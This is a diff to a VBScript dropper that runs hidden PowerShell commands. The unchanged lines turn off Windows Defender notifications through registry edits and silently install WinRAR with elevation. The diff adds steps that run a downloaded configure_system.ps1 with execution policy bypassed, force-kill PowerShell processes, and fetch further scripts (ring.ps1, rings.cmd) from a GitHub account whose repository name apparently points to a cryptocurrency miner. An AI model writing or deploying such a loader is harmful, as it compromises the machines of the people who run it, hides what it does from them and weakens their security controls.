@@ -16,6 +16,10 @@ objShell.Run "powershell.exe -Command reg add 'HKCU\Software\Microsoft\Windows\C
 objShell.Run "powershell.exe -Command reg add 'HKCU\Software\Policies\Microsoft\Windows Defender Security Center\Notifications' /v 'DisableEnhancedNotifications' /t REG_DWORD /d '1' /f", 0, True
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/Salvium-SAL-/refs/heads/main/Autorun.vbs -OutFile C:\Users\Public\Downloads\Autorun.vbs", 0, True
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/configure_system.ps1 -OutFile C:\Users\Public\Downloads\configure_system.ps1", 0, True
+objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\configure_system.ps1", 0, True
+objShell.Run "powershell.exe -Command Get-Process -Name powershell | Stop-Process -Force", 0, True
+objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/ring.ps1 -OutFile C:\Users\Public\Downloads\ring.ps1", 0, True
+objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/rings.cmd -OutFile C:\Users\Public\Downloads\rings.cmd", 0, True
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/hid.vbs -OutFile C:\Users\Public\Downloads\hid.vbs", 0, True
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe -OutFile C:\Users\Public\Downloads\winrar-x64-701.exe", 0, True
 objShell.Run "powershell.exe -Command Start-Process -FilePath 'C:\Users\Public\Downloads\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs", 0, True
